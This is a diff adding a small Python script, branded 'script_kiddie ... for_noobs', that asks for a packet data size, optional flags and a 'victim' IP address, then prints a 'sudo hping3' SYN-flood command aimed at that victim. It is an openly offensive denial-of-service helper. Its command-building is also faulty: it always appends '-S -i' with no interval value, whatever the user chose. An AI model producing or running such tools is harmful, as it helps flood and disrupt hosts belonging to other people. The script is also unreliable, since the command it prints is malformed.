@@ -1,0 +1,23 @@
+print("[-------------------------------------------------------------------------]")
+print("[ [^]___[^]   [^^^^]    (#)   [^^\ [^]     [^^^^^^]       33333333333     ]")
+print("[ [ ]___[ ]   [[+]_]   [^^]   [   \[ ]     [------]               \       ]")
+print("[ [_]   [_]   [__]     [__]   [_]\_[ ]      ______]           33333       ]")
+print("[                                                                 /       ]")
+print("[    script_kiddie                                        33333333333     ]")
+print("[         hping3                                                          ]")
+print("[       script_maker                                                      ]")
+print("[                             for_noobs                                   ]")
+print("[                                                                         ]")
+print("[        sss    k k         O         d      d      eee        rrrr       ]")
+print("[       s       kk                    d      d     e O e       r  r       ]")
+print("[        sss    k           i     ddddd  ddddd      eee        rrr        ]")
+print("[           s   kk          i     d   d  d   d     e           r  r       ]")
+print("[        sss    k  k        i     ddddd  ddddd    eeeee        r   r      ]")
+print("[_________________________________________________________________________]")
+
+
+saved_data = input ("for the -d options(-d=how much data sent), how much data u wanna send: \n")
+saved_s_i = input ("do you want the -S -i option?(if no dont put anything and if you want it type '-S -i': \n")
+saved_ip_adress = input ("whats the ip adresss of the victim? : \n")
+
+print("sudo hping3 -d " + saved_data + " " + saved_s_i + " -S -i " + saved_ip_adress)
